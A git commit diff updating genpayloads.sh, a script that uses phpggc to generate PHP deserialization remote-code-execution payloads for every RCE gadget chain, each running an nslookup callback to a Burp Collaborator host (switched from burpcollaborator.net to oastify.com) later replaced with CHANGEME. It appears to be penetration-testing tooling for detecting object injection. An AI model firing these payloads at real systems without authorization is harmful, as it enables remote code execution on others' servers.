150cdec63569c9096177989e836f72f9f3bbd223
Ricardo <ricardojba@users.noreply.github.com>
2022-07-07 09:48:40 +0100

    Update genpayloads.sh
    change the old DNS endpoint to the new DNS endpoint now being used by Burp Suite

--- genpayloads.sh
+++ genpayloads.sh
@@ -2,7 +2,7 @@
 
 # based on https://gist.github.com/honoki/029425e61e829a9344558c8587c29f0f#file-phpggc-generate-payloads-sh
 function="system"
-command="nslookup poi-slinger.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.burpcollaborator.net"
+command="nslookup poi-slinger.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oastify.com"
 options="-s"
 ~/phpggc/phpggc -l | grep RCE | cut -d' ' -f1 | xargs -L 1 ~/phpggc/phpggc -i | grep 'phpggc ' --line-buffered |
 while read line;  do
@@ -10,18 +10,18 @@ while read line;  do
    if echo $line | grep -q "<function> <parameter>"; then
       echo -e "\n"
       echo $gadget "<function> <parameter>"
-      ~/phpggc/phpggc $options $gadget "$function" "$command" | sed 's/poi-slinger.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.burpcollaborator.net/CHANGEME/g' | jq -aR .
+      ~/phpggc/phpggc $options $gadget "$function" "$command" | sed 's/poi-slinger.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oastify.com/CHANGEME/g' | jq -aR .
    elif echo $line | grep -q "<code>"; then
       echo -e "\n"
       echo $gadget "<code>"
-      ~/phpggc/phpggc $options $gadget "$function('$command');" | sed 's/poi-slinger.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.burpcollaborator.net/CHANGEME/g' | jq -aR .
+      ~/phpggc/phpggc $options $gadget "$function('$command');" | sed 's/poi-slinger.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oastify.com/CHANGEME/g' | jq -aR .
    elif echo $line | grep -q "<command>"; then
       echo -e "\n"
       echo $gadget "<command>"
-      ~/phpggc/phpggc $options $gadget "$command?$(date +%s)" | sed 's/poi-slinger.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.burpcollaborator.net/CHANGEME/g' | jq -aR .
+      ~/phpggc/phpggc $options $gadget "$command?$(date +%s)" | sed 's/poi-slinger.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oastify.com/CHANGEME/g' | jq -aR .
    else
       echo -e "\n"
       echo $gadget
-      ~/phpggc/phpggc $options $gadget | sed 's/poi-slinger.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.burpcollaborator.net/CHANGEME/g' | jq -aR .
+      ~/phpggc/phpggc $options $gadget | sed 's/poi-slinger.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oastify.com/CHANGEME/g' | jq -aR .
    fi;
 done
